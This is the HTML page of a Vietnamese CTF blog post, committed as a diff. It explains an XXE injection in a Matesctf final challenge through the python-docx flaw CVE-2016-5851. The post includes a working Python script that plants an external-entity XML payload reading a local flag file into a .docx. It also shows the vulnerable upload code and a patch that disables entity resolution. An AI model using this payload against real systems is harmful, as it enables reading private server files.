@@ -1,0 +1,345 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <title>Hugo Theme  | Matesctf final 2 - XXE Injection</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <link href="https://fonts.googleapis.com/css?family=Open+Sans" rel="stylesheet">
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/bulma/0.7.1/css/bulma.min.css" />
+    <link rel="stylesheet" href="https://hungry-visvesvaraya-d246d6.netlify.com/css/blog.css" />
+    
+</head>
+<body>
+
+    
+    <nav class="navbar is-fixed-top" role="navigation" aria-label="main navigation">
+        <div class="navbar-brand">
+            <a class="navbar-item" href="https://hungry-visvesvaraya-d246d6.netlify.com/">Home</a>
+            <a class="navbar-item" href="https://hungry-visvesvaraya-d246d6.netlify.com/about">About</a>
+        </div>
+    </nav>
+    
+
+    
+    <section class="hero is-info is-medium">
+        <div class="hero-body" style="background-image: url(https://hungry-visvesvaraya-d246d6.netlify.com/img/bg-blog.jpg);">
+            <div class="container has-text-centered">
+                <br>
+                <h1 class="title is-size-1">
+                    
+                        Matesctf final 2 - XXE Injection
+                    
+                </h1>
+                
+            </div>
+        </div>
+    </section>
+
+
+<div class="container">
+    <div class="section">
+    
+
+<div class="columns">
+    <div class="column is-9">
+        <div class="tile is-child box">
+            <div class="content">
+                
+
+<figure>
+    <img src="https://hungry-visvesvaraya-d246d6.netlify.com/images/posts/ex50-7.png"/> 
+</figure>
+
+
+<h2 id="exploit-source-resources-matesctf-ex50-tar">EXPLOIT - <a href="https://hungry-visvesvaraya-d246d6.netlify.com/resources/matesctf/ex50.tar">source</a></h2>
+
+<hr>
+
+<p>Mình nhận thấy lỗi này đầu tiên, mình tưởng đây là LFI cơ, vì cho mình đọc nội dung của cái gì đó (trên hình) và download file nữa. <img 
+	src="https://hungry-visvesvaraya-d246d6.netlify.com/emoji/lol.gif" 
+	width="30px" height="30px" 
+	style="display: inline;" 
+/></p>
+
+<pre><code>python-docx is a Python library for creating and updating Microsoft Word (.docx) files.
+</code></pre>
+
+<p><code>Docx</code> là thư viện sử dụng để xử lý file word. Cũng dễ hiểu đây là lỗi vì không cớ gì mà tác giả lại xử lý file word ở đây cả, chức năng upload và hiển thị nội dung file bình thường thì tại sao lại xử lý file docx làm gì. Sau khi tìm hiểu thì mình tìm được CVE của <a href="https://www.cvedetails.com/cve/CVE-2016-5851/">docx</a>. Tìm hiểu thêm thì đã có exploit sẵn, cụ thể mình cần tạo 1 file docx bất kì rồi chạy payload bên dưới, nhúng nội dung XML vào cuối file word đấy:</p>
+
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> docx
+<span style="color:#f92672">import</span> zipfile
+<span style="color:#f92672">import</span> tempfile
+<span style="color:#f92672">import</span> os
+
+<span style="color:#75715e"># define malicious XML</span>
+xml_string <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;&#39;&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34; standalone=&#34;yes&#34;?&gt;
+</span><span style="color:#e6db74">&lt;!DOCTYPE w:document [
+</span><span style="color:#e6db74">  &lt;!ENTITY xxe SYSTEM &#34;file:///home/ctf/ex50/flag&#34; &gt;
+</span><span style="color:#e6db74">]&gt;
+</span><span style="color:#e6db74">&lt;w:document xmlns:o=&#34;urn:schemas-microsoft-com:office:office&#34;
+</span><span style="color:#e6db74">xmlns:r=&#34;http://schemas.openxmlformats.org/officeDocument/2006/relationships&#34;
+</span><span style="color:#e6db74">xmlns:v=&#34;urn:schemas-microsoft-com:vml&#34;
+</span><span style="color:#e6db74">xmlns:w=&#34;http://schemas.openxmlformats.org/wordprocessingml/2006/main&#34;
+</span><span style="color:#e6db74">xmlns:w10=&#34;urn:schemas-microsoft-com:office:word&#34;
+</span><span style="color:#e6db74">xmlns:wp=&#34;http://schemas.openxmlformats.org/drawingml/2006/wordprocessingDrawing&#34;&gt;
+</span><span style="color:#e6db74">&lt;w:body&gt;
+</span><span style="color:#e6db74">&lt;w:p&gt;
+</span><span style="color:#e6db74">&lt;w:pPr&gt;
+</span><span style="color:#e6db74">&lt;w:pStyle w:val=&#34;Normal&#34; /&gt;
+</span><span style="color:#e6db74">&lt;w:rPr&gt;&lt;/w:rPr&gt;
+</span><span style="color:#e6db74">&lt;/w:pPr&gt;
+</span><span style="color:#e6db74">&lt;w:r&gt;
+</span><span style="color:#e6db74">&lt;w:rPr&gt;&lt;/w:rPr&gt;
+</span><span style="color:#e6db74">&lt;w:t&gt;
+</span><span style="color:#e6db74">Pierre Ernst, Salesforce --[&amp;xxe;]--
+</span><span style="color:#e6db74">&lt;/w:t&gt;
+</span><span style="color:#e6db74">&lt;/w:r&gt;
+</span><span style="color:#e6db74">&lt;/w:p&gt;
+</span><span style="color:#e6db74">&lt;w:p&gt;
+</span><span style="color:#e6db74">&lt;w:pPr&gt;
+</span><span style="color:#e6db74">&lt;w:pStyle w:val=&#34;Normal&#34; /&gt;
+</span><span style="color:#e6db74">&lt;w:rPr&gt;&lt;/w:rPr&gt;
+</span><span style="color:#e6db74">&lt;/w:pPr&gt;
+</span><span style="color:#e6db74">&lt;w:r&gt;
+</span><span style="color:#e6db74">&lt;w:rPr&gt;&lt;/w:rPr&gt;
+</span><span style="color:#e6db74">&lt;w:t&gt;&lt;/w:t&gt;
+</span><span style="color:#e6db74">&lt;/w:r&gt;
+</span><span style="color:#e6db74">&lt;/w:p&gt;
+</span><span style="color:#e6db74">&lt;w:sectPr&gt;
+</span><span style="color:#e6db74">&lt;w:type w:val=&#34;nextPage&#34; /&gt;
+</span><span style="color:#e6db74">&lt;w:pgSz w:w=&#34;12240&#34; w:h=&#34;15840&#34; /&gt;
+</span><span style="color:#e6db74">&lt;w:pgMar w:left=&#34;1134&#34; w:right=&#34;1134&#34; w:header=&#34;0&#34; w:top=&#34;1134&#34;
+</span><span style="color:#e6db74">w:footer=&#34;0&#34; w:bottom=&#34;1134&#34; w:gutter=&#34;0&#34; /&gt;
+</span><span style="color:#e6db74">&lt;w:pgNumType w:fmt=&#34;decimal&#34; /&gt;
+</span><span style="color:#e6db74">&lt;w:formProt w:val=&#34;false&#34; /&gt;
+</span><span style="color:#e6db74">&lt;w:textDirection w:val=&#34;lrTb&#34; /&gt;
+</span><span style="color:#e6db74">&lt;/w:sectPr&gt;
+</span><span style="color:#e6db74">&lt;/w:body&gt;
+</span><span style="color:#e6db74">&lt;/w:document&gt;&#39;&#39;&#39;</span>
+
+<span style="color:#75715e"># source: http://stackoverflow.com/questions/25738523/how-to-update-one-file-inside-zip-file-using-python</span>
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">updateZip</span>(zipname, filename, data):
+    <span style="color:#75715e"># generate a temp file</span>
+    tmpfd, tmpname <span style="color:#f92672">=</span> tempfile<span style="color:#f92672">.</span>mkstemp(dir<span style="color:#f92672">=</span>os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>dirname(zipname))
+    os<span style="color:#f92672">.</span>close(tmpfd)
+
+    <span style="color:#75715e"># create a temp copy of the archive without filename</span>
+    <span style="color:#66d9ef">with</span> zipfile<span style="color:#f92672">.</span>ZipFile(zipname, <span style="color:#e6db74">&#39;r&#39;</span>) <span style="color:#66d9ef">as</span> zin:
+        <span style="color:#66d9ef">with</span> zipfile<span style="color:#f92672">.</span>ZipFile(tmpname, <span style="color:#e6db74">&#39;w&#39;</span>) <span style="color:#66d9ef">as</span> zout:
+            <span style="color:#66d9ef">for</span> item <span style="color:#f92672">in</span> zin<span style="color:#f92672">.</span>infolist():
+                <span style="color:#66d9ef">if</span> item<span style="color:#f92672">.</span>filename <span style="color:#f92672">!=</span> filename:
+                    zout<span style="color:#f92672">.</span>writestr(item, zin<span style="color:#f92672">.</span>read(item<span style="color:#f92672">.</span>filename))
+
+    <span style="color:#75715e"># replace with the temp archive</span>
+    os<span style="color:#f92672">.</span>remove(zipname)
+    os<span style="color:#f92672">.</span>rename(tmpname, zipname)
+
+    <span style="color:#75715e"># now add filename with its new data</span>
+    <span style="color:#66d9ef">with</span> zipfile<span style="color:#f92672">.</span>ZipFile(zipname, mode<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;a&#39;</span>,
+compression<span style="color:#f92672">=</span>zipfile<span style="color:#f92672">.</span>ZIP_DEFLATED) <span style="color:#66d9ef">as</span> zf:
+        zf<span style="color:#f92672">.</span>writestr(filename, data)
+
+<span style="color:#75715e"># update legit docx file with malicious XML</span>
+updateZip(<span style="color:#e6db74">&#39;whatever.docx&#39;</span>, <span style="color:#e6db74">&#39;word/document.xml&#39;</span>, xml_string)
+
+<span style="color:#75715e"># process with python-docx</span>
+document <span style="color:#f92672">=</span> docx<span style="color:#f92672">.</span>Document(<span style="color:#e6db74">&#39;whatever.docx&#39;</span>)
+<span style="color:#66d9ef">print</span> <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">.</span>join([paragraph<span style="color:#f92672">.</span>text <span style="color:#66d9ef">for</span> paragraph <span style="color:#f92672">in</span> document<span style="color:#f92672">.</span>paragraphs])</code></pre></div>
+
+<p>Tại sao lại nén zip? Vì bản chất file docx là 1 file nén chứa nhiều file xml bên trong. Sau khi chạy payload thì đoạn xml đã được chèn vào file document.xml</p>
+
+<figure>
+    <img src="https://hungry-visvesvaraya-d246d6.netlify.com/images/posts/ex50-8.png"/> 
+</figure>
+
+
+<p>Vậy là upload bằng cách create exercise và view exercise, ta nhận được flag.</p>
+
+<figure>
+    <img src="https://hungry-visvesvaraya-d246d6.netlify.com/images/posts/ex50-9.png"/> 
+</figure>
+
+
+<p>Truy ra nguồn gốc của lỗi này thì do 1 func xử lý exercises đã parse file .docx và lấy nội dung lưu vào database</p>
+
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">try</span>:
+   document <span style="color:#f92672">=</span> docx<span style="color:#f92672">.</span>Document(os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(UPLOAD_FOLDER_EX, filename))
+   content <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">.</span>join([paragraph<span style="color:#f92672">.</span>text <span style="color:#66d9ef">for</span> paragraph <span style="color:#f92672">in</span> document<span style="color:#f92672">.</span>paragraphs])
+<span style="color:#66d9ef">except</span>:
+   content <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Cannot get content&#34;</span>
+Exercises<span style="color:#f92672">.</span>insert({<span style="color:#e6db74">&#34;name&#34;</span>: name, <span style="color:#e6db74">&#34;file_path&#34;</span>: file_path,<span style="color:#e6db74">&#34;date&#34;</span>:date,<span style="color:#e6db74">&#34;uploader&#34;</span>:session[<span style="color:#e6db74">&#39;usn&#39;</span>],<span style="color:#e6db74">&#34;content&#34;</span>:content})</code></pre></div>
+
+<p>Nhờ một thời gian phân tích 1-day nhiều dạng, mình rút ra được cách fix lỗi nhanh nhất là đi tìm bản patch từ nhà cung cấp và đọc xem họ fix như thế nào, như thế sẽ nhanh hơn là tự suy nghĩ cách vá. Các bạn có thể xem bản vá trên <a href="https://github.com/python-openxml/python-docx/pull/303/commits/14a44178711cbd860b910f8950f9946addfc5e57">github</a>. Họ disable XML entity, đây là cách vá hay nhất mà mình biết.</p>
+
+<p>Bước đầu tiên là phải tìm ra được file thư viện nằm ở vị trí nào trên server của mình</p>
+
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ python -c <span style="color:#e6db74">&#34;import docx; print docx.__file__&#34;</span>
+&gt; /usr/local/lib/python2.7/dist-packages/docx/__init__.pyc</code></pre></div>
+
+<p>Từ link github trên mình cũng biết là file cần fix là <code>docx/oxml/__init__.py</code> . Chỉ cần sửa dòng số 17 thôi là đủ</p>
+
+<pre><code>oxml_parser = etree.XMLParser(remove_blank_text=True,resolve_entities=False)
+</code></pre>
+
+<figure>
+    <img src="https://hungry-visvesvaraya-d246d6.netlify.com/images/posts/ex50-10.png"/> 
+</figure>
+
+
+<p>NHƯNG, đời không như mơ đâu các bạn à !!! Chúng ta không có quyền để sửa file <code>__init__.py</code></p>
+
+<h2 id="solutions">SOLUTIONS</h2>
+
+<hr>
+
+<p>To be continue &hellip;</p>
+
+            </div>
+        </div>
+    </div>
+    <div class="column is-3">
+        <div class="card">
+    <div class="card-content">
+        <h1 class="title is-5">Tags</h1>
+        <div class="tags">
+        
+            <span class="tag"><a href="https://hungry-visvesvaraya-d246d6.netlify.com/tags/ctf">ctf</a></span>
+        
+            <span class="tag"><a href="https://hungry-visvesvaraya-d246d6.netlify.com/tags/cve">cve</a></span>
+        
+            <span class="tag"><a href="https://hungry-visvesvaraya-d246d6.netlify.com/tags/flask">flask</a></span>
+        
+            <span class="tag"><a href="https://hungry-visvesvaraya-d246d6.netlify.com/tags/laravel">laravel</a></span>
+        
+            <span class="tag"><a href="https://hungry-visvesvaraya-d246d6.netlify.com/tags/matesctf">matesctf</a></span>
+        
+            <span class="tag"><a href="https://hungry-visvesvaraya-d246d6.netlify.com/tags/php">php</a></span>
+        
+            <span class="tag"><a href="https://hungry-visvesvaraya-d246d6.netlify.com/tags/python">python</a></span>
+        
+            <span class="tag"><a href="https://hungry-visvesvaraya-d246d6.netlify.com/tags/serialization">serialization</a></span>
+        
+            <span class="tag"><a href="https://hungry-visvesvaraya-d246d6.netlify.com/tags/svattt-2018">svattt-2018</a></span>
+        
+            <span class="tag"><a href="https://hungry-visvesvaraya-d246d6.netlify.com/tags/svattt-final-2018">svattt-final-2018</a></span>
+        
+        </div>          
+    </div>
+</div><br>
+        <div class="card">
+    <div class="card-content">
+        <h1 class="title is-5">Recent posts</h1>
+        
+            <h1><a href="https://hungry-visvesvaraya-d246d6.netlify.com/post/new_year_2019/">New year 2019</a></h1>
+            <time class="has-text-grey-light is-size-7">1 January 2019</time>
+        
+            <h1><a href="https://hungry-visvesvaraya-d246d6.netlify.com/post/svattt_final_2018_web_2_roundcube_mail/">SVATTT final 2018 - roundcube mail</a></h1>
+            <time class="has-text-grey-light is-size-7">20 November 2018</time>
+        
+            <h1><a href="https://hungry-visvesvaraya-d246d6.netlify.com/post/svattt_2018_web_3_secure_document_service/">SVATTT 2018 - Secure document service</a></h1>
+            <time class="has-text-grey-light is-size-7">5 November 2018</time>
+        
+            <h1><a href="https://hungry-visvesvaraya-d246d6.netlify.com/post/laravel-object-injection-to-rce/">Laravel object injection to RCE</a></h1>
+            <time class="has-text-grey-light is-size-7">25 October 2018</time>
+        
+            <h1><a href="https://hungry-visvesvaraya-d246d6.netlify.com/post/php_object_injection_without_unserialize/">Php Object Injection Without Unserialize</a></h1>
+            <time class="has-text-grey-light is-size-7">20 September 2018</time>
+        
+    </div>
+</div>
+    <br>
+                
+  
+
+
+
+<div class="card">
+    <div class="card-content">
+        <h1 class="title is-5">Related posts</h1>
+      
+      
+            <h1><a href="https://hungry-visvesvaraya-d246d6.netlify.com/post/svattt_final_2018_web_2_roundcube_mail/">SVATTT final 2018 - roundcube mail</a></h1>
+            <time class="has-text-grey-light is-size-7">20 November 2018</time>
+      
+            <h1><a href="https://hungry-visvesvaraya-d246d6.netlify.com/post/svattt_2018_web_3_secure_document_service/">SVATTT 2018 - Secure document service</a></h1>
+            <time class="has-text-grey-light is-size-7">5 November 2018</time>
+      
+            <h1><a href="https://hungry-visvesvaraya-d246d6.netlify.com/post/matesctf-final-2-brute-mongodb-_id/">Matesctf final 2 - Brute mongodb _id</a></h1>
+            <time class="has-text-grey-light is-size-7">13 September 2018</time>
+      
+            <h1><a href="https://hungry-visvesvaraya-d246d6.netlify.com/post/meepwn_qual_round_web_pycalx_1/">Meepwn qual round - pycalx 1</a></h1>
+            <time class="has-text-grey-light is-size-7">11 September 2018</time>
+      
+            <h1><a href="https://hungry-visvesvaraya-d246d6.netlify.com/post/matesctf_final_2_web_ex50_rce/">Matesctf final 2 - IP Spoofing to RCE in flask</a></h1>
+            <time class="has-text-grey-light is-size-7">8 September 2018</time>
+      
+            <h1><a href="https://hungry-visvesvaraya-d246d6.netlify.com/post/matesctf_final_2_web_ex50_ssti/">Matesctf final 2 - SSTI</a></h1>
+            <time class="has-text-grey-light is-size-7">8 September 2018</time>
+      
+    </div>
+</div>
+
+    
+<br>
+        <div class="card">
+    <div class="card-content">
+        <h1 class="title is-5">Archives</h1>
+        
+            <a href="https://hungry-visvesvaraya-d246d6.netlify.com/archives/2019">2019</a> (1)<br>
+        
+            <a href="https://hungry-visvesvaraya-d246d6.netlify.com/archives/2018">2018</a> (9)<br>
+        
+    </div>
+</div>
+
+    </div>
+</div>
+
+
+    </div>
+    
+    <div id="disqus_thread"></div>
+</div>
+
+
+<script>
+
+
+
+
+var disqus_config = function () {
+this.page.url = "https:\/\/hungry-visvesvaraya-d246d6.netlify.com\/";  
+this.page.identifier = "blog-kev"; 
+};
+
+(function() { 
+var d = document, s = d.createElement('script');
+s.src = 'https://blog-kev.disqus.com/embed.js';
+s.setAttribute('data-timestamp', +new Date());
+(d.head || d.body).appendChild(s);
+})();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+                            
+
+
+<footer class="footer has-background-grey-darker has-text-white">
+    <div class="content has-text-centered">
+        <p>
+            <span class="icon is-large"><a href="https://twitter.com/" class="mysocial"><i class="fab fa-twitter fa-3x"></i></a></span>&nbsp;&nbsp;
+            <span class="icon is-large"><a href="https://www.youtube.com/" class="mysocial"><i class="fab fa-youtube fa-3x"></i></a></span>&nbsp;&nbsp;
+            <span class="icon is-large"><a href="https://github.com/" class="mysocial"><i class="fab fa-github fa-3x"></i></a></span>&nbsp;&nbsp;
+            <br><br>
+            Copyright &copy; Hugo Theme 2019</a>
+        </p>
+    </div>
+</footer>
+
+<script defer src="https://use.fontawesome.com/releases/v5.1.0/js/all.js"></script>
+
+<script id="dsq-count-scr" src="//blog-kev.disqus.com/count.js" async></script>
+</body>
+</html>
